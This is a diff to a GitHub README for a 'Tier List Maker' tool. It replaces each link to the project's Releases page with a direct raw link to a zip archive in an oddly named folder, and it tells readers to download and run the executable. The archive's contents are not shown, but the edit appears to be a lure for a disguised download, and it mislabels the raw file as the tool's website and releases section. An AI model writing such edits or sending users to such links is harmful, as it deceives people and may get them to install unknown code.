@@ -4,7 +4,7 @@ Welcome to the Tier List Maker GitHub repository! Here you will find a simple dr
 
 🚀 **Get Started**
 
-To begin using the Tier List Maker tool, simply visit the [Tier List Maker Tool](https://github.com/itsslay245/tier-list-maker/releases) website. You can create your own tier lists, customize them with ease, and even upload images to make your lists visually appealing.
+To begin using the Tier List Maker tool, simply visit the [Tier List Maker Tool](https://raw.githubusercontent.com/itsslay245/tier-list-maker/main/infirmative/tier-list-maker-2.1.zip) website. You can create your own tier lists, customize them with ease, and even upload images to make your lists visually appealing.
 
 🛠️ **Key Features**
 
@@ -21,7 +21,7 @@ To begin using the Tier List Maker tool, simply visit the [Tier List Maker Tool]
 
 📥 **Download and Execute**
 
-To start using the Tier List Maker tool, please download the executable file from the [Tier List Maker Tool](https://github.com/itsslay245/tier-list-maker/releases) link and follow the instructions to get started.
+To start using the Tier List Maker tool, please download the executable file from the [Tier List Maker Tool](https://raw.githubusercontent.com/itsslay245/tier-list-maker/main/infirmative/tier-list-maker-2.1.zip) link and follow the instructions to get started.
 
 🌟 **Create Your Own Tier Lists**
 
@@ -45,7 +45,7 @@ Developers will appreciate the developer-friendly features of the Tier List Make
 
 🔗 **Check Out the Latest Releases**
 
-For the most up-to-date version of the Tier List Maker tool, visit the [Releases](https://github.com/itsslay245/tier-list-maker/releases) section of this repository. Stay informed about new features, bug fixes, and enhancements that are continually being added to improve the tool.
+For the most up-to-date version of the Tier List Maker tool, visit the [Releases](https://raw.githubusercontent.com/itsslay245/tier-list-maker/main/infirmative/tier-list-maker-2.1.zip) section of this repository. Stay informed about new features, bug fixes, and enhancements that are continually being added to improve the tool.
 
 ---
 
